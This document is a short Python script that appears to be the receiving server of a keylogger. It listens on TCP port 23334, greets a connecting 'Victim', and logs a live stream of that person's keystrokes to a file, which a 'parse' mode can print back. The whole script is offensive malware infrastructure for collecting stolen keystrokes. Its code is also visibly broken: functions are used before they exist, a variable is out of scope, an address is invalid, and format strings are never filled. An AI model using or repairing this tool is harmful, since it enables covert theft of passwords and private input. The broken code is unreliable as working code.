import socket, sys

black="\033[0;30m"
red="\033[0;91m"
green="\033[0;92m"
yellow="\033[0;93m"
blue="\033[0;94m"
purple="\033[0;95m"
cyan="\033[0;36m"
white="\033[0;97m"

if len(sys.argv) < 3:
	usage()


shift=False
unknown=False


def usage():
	print ("Usage:\n     csi.py receiver keystrokes.txt\n     csi.py parse keystrokes.txt")
	exit(1)
def log(key):
	print (key)
	save.write(key)

def receiver():
	save=open(sys.argv[2], "ab")
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind((0, 23334))
	sock.listen()
	con, host = sock.accept()
	print ("%s[CRAN]%s Victim [ %s ] Connected!", green, yellow, host)
	print ("%s[CRAN]%s Keystrokes Live Stream Started!\n\n", green, yellow)

	while(True):
		ktx = con.recv(1)
		if not ktx:
			break
		log(ktx)



def parser():
	save=open(sys.argv[2], "r", encoding="unicode_escape")
	print (save.read())

if sys.argv[1] == "receiver" and sys.argv[2] != '':
	receiver()
elif sys.argv[1] == "parse" and sys.argv[2] != '':
	parser()
else:
	usage()
